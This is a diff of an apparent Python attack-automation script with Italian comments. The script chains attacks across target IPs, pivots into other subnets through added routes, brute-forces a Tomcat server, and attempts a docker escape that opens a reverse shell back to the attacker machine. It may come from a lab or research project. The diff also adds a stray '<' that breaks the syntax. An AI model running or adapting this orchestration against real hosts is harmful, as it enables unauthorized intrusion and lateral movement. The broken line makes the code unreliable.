@@ -91,18 +91,18 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                         #Se l'attacco che ha avuto successo è bruteForce, dopo si fa docker escape
                         #TODO sistemare
                         if(attack_name=="bruteForce"):
-                            print(f"{C.COL_YELLOW} Tomcat_server vulnerability detected, trying docker escape... {C.COL_RESET}")
-                            print(f"{C.COL_YELLOW} For this attack to be successful copy of a file from the container to the host must be attempted on the host {C.COL_RESET}")
+                            print(f"{C.COL_YELLOW}Tomcat_server vulnerability detected, trying docker escape... {C.COL_RESET}")
+                            print(f"{C.COL_YELLOW}For this attack to be successful copy of a file from the container to the host must be attempted on the host {C.COL_RESET}")
 
-                        #Viene port forwarding (il docker escape viene fatto passare per la macchina intermedia che poi apre una reverse shell verso la macchina attaccante) 
+                        #Viene fatto port forwarding (il docker escape viene fatto passare per la macchina intermedia che poi apre una reverse shell verso la macchina attaccante) 
                         #Altrimenti, essendo la macchina target e la macchina bersagio in diverse sottoreti, l'attacco non sarebbe possibile
                             mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                             docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
                             escape = mc.docker_escape(docker_escape_attack_object)
                             if(escape):
-                                print(f"{C.COL_GREEN} docker_escape successful!{C.COL_RESET}")
+                                print(f"{C.COL_GREEN}docker_escape successful!{C.COL_RESET}")
                             else:
-                                print(f"{C.COL_RED} docker_escape failed!{C.COL_RESET}")
+                                print(f"{C.COL_RED}docker_escape failed!{C.COL_RESET}")
                                 break  
 
                         break
@@ -139,9 +139,9 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
             if target_ip in visited_ips:
                 continue
             print(f"{C.COL_GREEN}[+] target for this step: {target_ip} {C.COL_RESET}")
-            visited_ips.add(target_ip)
+            visited_ips.add(target_ip)<
 
-            if atk_sess is not None:
+            if atk_sess:
                 met_sess = mc.upgrade_shell(atk_sess)
 
             if target_ip in other_subnet:
@@ -154,13 +154,12 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                     mc.route_add(met_sess["id_sess"], target_ip)
                     router = met_sess
 
-
             LPORT = None
             for p in C.TARGETS_DOCKERS[target_ip]:
                 LPORT = p["exposed_port"]
                 break
 
-            #Eseguire tutti gli attacchi sull'ip corrente prima di passare al successivo
+            #Vengono eseguiti tutti gli attacchi sull'ip corrente prima di passare al successivo
             for attack in [a for ip, a in attack_sequence if ip == target_ip]:
                 print(f"{C.COL_GREEN}[+] attacking ({target_ip}) with {attack}{C.COL_RESET}")
                 attack_obj = attack_db.create_attack(attack, target_ip, attacker_ip, LPORT)
@@ -170,7 +169,6 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                     continue
 
                 session = mc.attempt_attack(attack_obj)
-
 
                 if session:
                     #si controlla che il successo dell'attacco non sia un falso positivo
@@ -183,18 +181,18 @@ def main_procedure(attacker_ip, config_file, attack_sequence_file=None, stealth=
                         #Se l'attacco che ha avuto successo è bruteForce, dopo si fa docker escape
                         #TODO sistemare
                         if(attack_name=="bruteForce"):
-                            print(f"{C.COL_YELLOW} Tomcat_server vulnerability detected, trying docker escape... {C.COL_RESET}")
-                            print(f"{C.COL_YELLOW} For this attack to be successful copy of a file from the container to the host must be attempted on the host {C.COL_RESET}")
+                            print(f"{C.COL_YELLOW}Tomcat_server vulnerability detected, trying docker escape... {C.COL_RESET}")
+                            print(f"{C.COL_YELLOW}For this attack to be successful copy of a file from the container to the host must be attempted on the host {C.COL_RESET}")
 
-                        #Viene port forwarding (il docker escape viene fatto passare per la macchina intermedia che poi apre una reverse shell verso la macchina attaccante) 
+                        #Viene fatto port forwarding (il docker escape viene fatto passare per la macchina intermedia che poi apre una reverse shell verso la macchina attaccante) 
                         #Altrimenti, essendo la macchina target e la macchina bersagio in diverse sottoreti, l'attacco non sarebbe possibile
                             mc.prepare(router["id_sess"], C.NETCAT_PORT, LPORT, attacker_ip)
                             docker_escape_attack_object = attack_db.create_attack("docker_escape", "0", attacker_ip, C.NETCAT_PORT)
                             escape = mc.docker_escape(docker_escape_attack_object)
                             if(escape):
-                                print(f"{C.COL_GREEN} docker_escape successful!{C.COL_RESET}")
+                                print(f"{C.COL_GREEN}docker_escape successful!{C.COL_RESET}")
                             else:
-                                print(f"{C.COL_RED} docker_escape failed!{C.COL_RESET}")
+                                print(f"{C.COL_RED}docker_escape failed!{C.COL_RESET}")
                                 break  
 
                         break
